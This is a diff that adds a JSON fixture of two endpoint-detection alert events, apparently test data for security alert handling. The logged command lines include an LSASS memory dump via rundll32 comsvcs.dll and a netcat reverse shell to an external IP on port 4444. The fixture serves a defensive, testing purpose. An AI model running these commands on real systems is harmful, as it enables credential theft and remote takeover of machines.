@@ -1,0 +1,33 @@
+[
+  {
+    "metadata": { "eventType": "DetectionSummaryEvent", "eventCreationTime": 1781445131000 },
+    "event": {
+      "DetectName": "Credential Theft via LSASS",
+      "Severity": 5,
+      "SeverityName": "Critical",
+      "Tactic": "Credential Access",
+      "Technique": "OS Credential Dumping",
+      "ComputerName": "FIN-WS-014",
+      "UserName": "corp\\jdoe",
+      "LocalIP": "10.20.30.40",
+      "CommandLine": "rundll32 comsvcs.dll, MiniDump 712 C:\\temp\\lsass.dmp full",
+      "PatternDispositionDescription": "Process killed"
+    }
+  },
+  {
+    "metadata": { "eventType": "DetectionSummaryEvent", "eventCreationTime": 1781445520000 },
+    "event": {
+      "DetectName": "Reverse Shell Behavior",
+      "Severity": 4,
+      "SeverityName": "High",
+      "Tactic": "Command and Control",
+      "Technique": "Application Layer Protocol",
+      "ComputerName": "OPS-SRV-02",
+      "UserName": "SYSTEM",
+      "LocalIP": "10.20.30.50",
+      "ExternalIP": "45.83.122.7",
+      "RemotePort": 4444,
+      "CommandLine": "cmd.exe /c nc 45.83.122.7 4444 -e cmd.exe"
+    }
+  }
+]
